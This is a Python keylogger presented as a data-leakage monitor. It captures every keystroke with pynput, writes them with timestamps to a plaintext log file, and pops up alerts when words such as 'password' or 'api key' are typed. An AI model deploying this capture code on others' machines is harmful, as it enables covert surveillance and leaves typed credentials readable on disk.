
import os
import sys
import time
import re
import json
import threading
import tkinter as tk
from tkinter import messagebox
from datetime import datetime
from collections import deque
from pynput import keyboard

class AdvancedKeylogger:
    def __init__(self):
        # Configuration
        self.log_dir = os.path.expanduser("~/.keylogger_data/")
        self.log_file = os.path.join(self.log_dir, "keystroke_log.txt")
        self.alert_log = os.path.join(self.log_dir, "security_alerts.txt")
        self.config_file = os.path.join(self.log_dir, "config.json")

        # Ensure directory exists
        os.makedirs(self.log_dir, exist_ok=True)

        # Buffer to store recent keystrokes for analysis
        self.keystroke_buffer = deque(maxlen=1000)  # Last 1000 keystrokes
        self.current_word = ""

        # Enhanced sensitive keyword regex patterns
        self.sensitive_patterns = [
            r"confidential",
            r"secret",
            r"classified",
            r"internal",
            r"proprietary",
            r"restricted",
            r"private",
            r"sensitive",
            r"trade[\W_]*secret",
            r"non[-_ ]disclosure",
            r"password",
            r"passw[o0]rd",
            r"credit[\W_]*card",
            r"ssn",
            r"social[\W_]*security",
            r"bank[\W_]*account",
            r"routing[\W_]*number",
            r"pin",
            r"salary",
            r"budget",
            r"financial",
            r"api[\W_]*key",
            r"access[\W_]*token",
            r"database",
            r"server",
            r"admin",
            r"root",
            r"master[\W_]*key",
            r"encryption",
            r"certificate",
            r"private[\W_]*key",
            r"merger",
            r"acquisition",
            r"layoff",
            r"restructure",
            r"patent",
            r"client[\W_]*list",
            r"customer[\W_]*data",
            r"employee[\W_]*records",
            r"hr",
            r"project[\W_]*alpha",
            r"project[\W_]*beta",
            r"codename",
            r"unreleased",
            r"prototype",
            r"beta[\W_]*version",
            r"development"
        ]

        # Alert settings
        self.alert_threshold = 1  # Number of sensitive words to trigger alert
        self.alert_cooldown = 300  # 5 minutes cooldown between same alerts
        self.last_alert_time = {}

        # Statistics
        self.stats = {
            "total_keystrokes": 0,
            "alerts_triggered": 0,
            "sessions": 0,
            "start_time": datetime.now()
        }

        print("Advanced Keylogger with Enhanced Data Leakage Detection initialized")
        print(f"Monitoring for {len(self.sensitive_patterns)} sensitive keyword patterns")
        print(f"Logs will be saved to: {self.log_dir}")

    def load_config(self):
        # Load or save config placeholder
        pass

    def log_keystroke(self, key, timestamp):
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"{timestamp} - {key}")
        except Exception as e:
            print(f"Logging error: {e}")

    def analyze_for_sensitive_data(self, text):
        found_keywords = []
        text_lower = text.lower()
        for pattern in self.sensitive_patterns:
            if re.search(pattern, text_lower):
                found_keywords.append(pattern)
        return found_keywords

    def trigger_alert(self, keywords, context):
        alert_id = "-".join(sorted(keywords))
        current_time = time.time()
        if alert_id in self.last_alert_time:
            if current_time - self.last_alert_time[alert_id] < self.alert_cooldown:
                return
        self.last_alert_time[alert_id] = current_time
        self.stats["alerts_triggered"] += 1
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        alert_message = f"""
SECURITY ALERT - POTENTIAL DATA LEAKAGE DETECTED
================================================
Time: {timestamp}
Sensitive keywords detected: {', '.join(keywords)}
Context: {context[:100]}...
Alert ID: {alert_id}
================================================
"""
        try:
            with open(self.alert_log, "a", encoding="utf-8") as f:
                f.write(alert_message + "")
        except Exception as e:
            print(f"Alert logging error: {e}")
        print(" " + "="*50)
        print("🚨 SECURITY ALERT - DATA LEAKAGE DETECTED! 🚨")
        print("="*50)
        print(f"Keywords: {', '.join(keywords)}")
        print(f"Time: {timestamp}")
        print(f"Context: {context[:100]}...")
        print("="*50 + "")
        threading.Thread(target=self.show_gui_alert, args=(keywords, context), daemon=True).start()
        try:
            if sys.platform == "win32":
                import winsound
                winsound.Beep(1000, 500)
            else:
                print("")
        except:
            pass

    def show_gui_alert(self, keywords, context):
        try:
            root = tk.Tk()
            root.withdraw()
            message = f"""SECURITY ALERT - POTENTIAL DATA LEAKAGE!

Sensitive keywords detected: {', '.join(keywords)}

Context: {context[:150]}...

Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Please review your input for sensitive company information."""
            messagebox.showwarning("Security Alert", message)
            root.destroy()
        except Exception as e:
            print(f"GUI alert error: {e}")

    def on_key_press(self, key):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.stats["total_keystrokes"] += 1
        try:
            if hasattr(key, 'char') and key.char:
                char = key.char
                self.current_word += char
                self.keystroke_buffer.append(char)
                self.log_keystroke(char, timestamp)
                if char in [' ', '\n', '\t', '.', ',', '!', '?', ';', ':']:
                    if len(self.current_word.strip()) > 2:
                        self.check_word_for_threats(self.current_word.strip())
                    self.current_word = ""
            else:
                key_name = f"[{key}]"
                self.keystroke_buffer.append(key_name)
                self.log_keystroke(key_name, timestamp)
                if key == keyboard.Key.space or key == keyboard.Key.enter:
                    self.check_buffer_for_threats()
        except Exception as e:
            print(f"Key processing error: {e}")

    def check_word_for_threats(self, word):
        if len(word) < 3:
            return
        found_keywords = self.analyze_for_sensitive_data(word)
        if found_keywords:
            context = ''.join(list(self.keystroke_buffer)[-50:])
            self.trigger_alert(found_keywords, context)

    def check_buffer_for_threats(self):
        if len(self.keystroke_buffer) < 10:
            return
        recent_text = ''.join([k for k in list(self.keystroke_buffer)[-100:] if isinstance(k, str) and len(k) == 1])
        found_keywords = self.analyze_for_sensitive_data(recent_text)
        if len(found_keywords) >= self.alert_threshold:
            self.trigger_alert(found_keywords, recent_text)

    def on_key_release(self, key):
        if key == keyboard.Key.esc:
            current_keys = set()
            if hasattr(self, '_pressed_keys'):
                if keyboard.Key.ctrl in self._pressed_keys and keyboard.Key.shift in self._pressed_keys:
                    return False

    def start_monitoring(self):
        print("Starting advanced keylogger monitoring...")
        print("Press Ctrl+C to stop monitoring")
        print("Monitoring for sensitive data patterns...")
        self.stats["sessions"] += 1
        try:
            with keyboard.Listener(
                on_press=self.on_key_press,
                on_release=self.on_key_release) as listener:
                listener.join()
        except KeyboardInterrupt:
            self.stop_monitoring()
        except Exception as e:
            print(f"Monitoring error: {e}")
            self.stop_monitoring()

    def stop_monitoring(self):
        end_time = datetime.now()
        duration = end_time - self.stats["start_time"]
        print(" " + "="*50)
        print("KEYLOGGER SESSION ENDED")
        print("="*50)
        print(f"Total keystrokes logged: {self.stats['total_keystrokes']}")
        print(f"Security alerts triggered: {self.stats['alerts_triggered']}")
        print(f"Session duration: {duration}")
        print(f"Data saved to: {self.log_dir}")
        print("="*50)
        try:
            stats_file = os.path.join(self.log_dir, "session_stats.json")
            with open(stats_file, "w") as f:
                stats_data = self.stats.copy()
                stats_data["start_time"] = self.stats["start_time"].isoformat()
                stats_data["end_time"] = end_time.isoformat()
                stats_data["duration_seconds"] = duration.total_seconds()
                json.dump(stats_data, f, indent=2)
        except Exception as e:
            print(f"Stats save error: {e}")

def main():
    print("="*60)
    print("ADVANCED KEYLOGGER WITH ENHANCED DATA LEAKAGE DETECTION")
    print("="*60)
    print("This tool monitors keyboard input for sensitive data patterns")
    print("and alerts when potential company data leakage is detected.")
    print("="*60)
    try:
        keylogger = AdvancedKeylogger()
        keylogger.start_monitoring()
    except KeyboardInterrupt:
        print("Keylogger stopped by user.")
    except Exception as e:
        print(f"Fatal error: {e}")
    finally:
        print("Keylogger session ended.")

if __name__ == "__main__":
    main()
